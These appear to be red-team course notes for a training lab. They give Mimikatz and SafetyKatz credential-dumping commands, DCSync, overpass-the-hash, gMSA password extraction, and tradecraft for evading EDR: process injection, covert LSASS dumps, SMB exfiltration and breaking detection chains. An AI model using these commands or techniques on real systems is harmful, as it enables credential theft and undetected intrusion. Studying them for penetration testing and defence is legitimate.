
### Extracting Credentials from LSASS


Dump credentia;s on a local machine Mimikatz

~~~
Invoke-Mimikatz -command '"sekurlsa::ekeys"'
~~~

Unsing Safetykatz(minidump of lsass and PELoader to run Mimikatz)

~~~
SafetyKatz.exe "sekurlsa::ekays"
~~~

Dump Credential Using SharpKatz (C# port of some Mimikatz functionality)

~~~
Sharpkatz.exe --command ekeys
~~~

Dump credentials using Dumpert (Direct System Calls and API unhooking)

~~~
rundll32.exe c:\Dumpert\Outflank-Dumpert.dll,Dump
~~~

OverPass-The-Hash

Over Pass the hash generate tokens from hashes or keys. Needs elevation

~~~
Invoke-Mimikatz -command '"sekurlsa::pth /user:Administrator /run:powershell.exe"'
~~~

DCSync

To extract credentials from the DC  without code execution on it, we can use DCSync.

~~~
Invoke-Mimikatz -command '"lsadump::dcsync /user:us\krbtgt"'
~~~

~~~
Safetykatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
~~~

Domain Admins privileges are required to run DCSync

### gMSA

A group Managed Service Account provides automatic password management 
use of gMSA is recommended to protect from Kerberoast type attacks
user reads attribute 'msds-MangedPassword' the gMSA password is computed


A gMSA has object class 'msDS_GroupManagedServiceAccount'. This can be used to find to find the accounts

Using ADModule

~~~
Get-ADServiceAccount -Filter *
~~~

Using PowerView

~~~
Get-DomainObject -LDAPFilter '(objectclass=msDS-GroupManagedServiceAccount)'
~~~

The attribute 'msDS-GroupMSAMembership' lists the principals that can read the password blob

~~~
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalAllowedToRetrieveManagedPassword
~~~

Once we have compromised a principal that can read the blob. Use ADModule to read and DSInternals to compute NTLM hash:

~~~
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
~~~

The _CurrentPassword_ attribute in the $decodedpwd contains the clear-text password but cannot be typed!

Passing the NTLM hash of the gMSA, we get privileges of the gMSA:

~~~
sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c684cc0fa1744195edd1aec43078
~~~

We can access the services and machines (server farms) that the account has access to

### Golden gMSA

The only ingredients the DC uses to generate the passwords, but we don’t have, are the following attributes of the KDS root key: 

- cn 
- msKds-SecretAgreementParam 
- msKds-RootKeyData 
- msKds-KDFParam 
- msKds-KDFAlgorithmID 
- msKds-CreateTime 
- msKds-UseStartTime 
- msKds-Version 
- msKds-DomainID 
- msKds-PrivateKeyLength 
- msKds-PublicKeyLength 
- msKds-SecretAgreementAlgorithmID


Once we compute the GKE for the associated KDS root key we can
generate the password offline.

Once we compute the GKE for the associated KDS root key we can
generate the password offline.

#### Endpoint Detection and Response (EDRs) & Microsoft Defender for Endpoint

Our objective is to remain undetected by AV and EDR on us-jump to perform:
– Lateral movement / remote access
– Tool transfer
– Credential extraction
– Data exfiltration

##### MDE - Credential Extraction – LSASS Dump


• Most tools create an LSASS dump by:
1. Gaining a handle to the LSASS process.
2. Creating a minidump using the MiniDumpWriteDump WinAPI function implemented in
dbghelp.dll / dbgcore.dll.
1. Writing the dump file on disk.


#### MockingJay Process Injection

Two possibilities of performing injection exist:
– Self Injection: Find a vulnerable trusted DLL with RWX permissions to copy our shellcode into and
load the DLL and execute shellcode.
– Remote Injection: Leveraging trusted applications that use a vulnerable trusted DLL with RWX
permissions to perform the same functionality as in Self Injection.


To find DLL's with an RWX portion we can use a POC such as:
https://github.com/pwnsauc3/RWXfinder

The DLL like 

~~~
C:\Program Files\Microsoft Visual
Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TeamFoundation\
Team Explorer\Git\usr\bin\msys-2.0.dll
~~~

doesn't allow to execute larger shellcodes.

A DLL such as mscorlib.ni.dll was found with enough room to accommodate mid to
big sized shellcode.

#### LSASS Dump using NanoDump

To perform a covert dump using nanodump we can attempt to use the arguments:
spoof-callstack (-sc) , fork LSASS process before dumping (-f) and output the
obfuscated dump to a file (--write). The dump can later be restored using
restore_signature provided in the source /scripts folder

~~~
PS C:\AD\Tools\MockingJay> C:\AD\Tools\MockingJay\donut.exe -f 1 -p ' -sc -f --write nano.dmp' -i
~~~


~~~
C:\AD\Tools\MockingJay\nanodump.x64.exe -o C:\AD\Tools\MockingJay\nano.bin
~~~


### MDE - Tool Transfer

Downloading tools over HTTP(S) can be risky as it does increase the risk score and
chances of detection by the EDR.

However, if a LOLBAS that is undetected and trusted by Microsoft such as msedge is
available on the target we can perform HTTP(S) downloads without any detections.

`https://lolbas-project.github.io/`

An opsec friendly alternative would be to share files over SMB. To copy and
exfiltrate an LSASS dump a covert technique would be to copy the file to our host if
we have admin privileges over the target over SMB privileged shares.

### MDE - Breaking Detection Chains

Most EDRs correlate activity in a specific time interval after which it is reset, this can
vary for each EDR.

To bypass these correlation-based detections we can:
– Attempt to wait for a small-time interval (~10 mins) before performing the next query.
– Append non malicious queries in between subsequent malicious ones to break the detection
chain altogether.

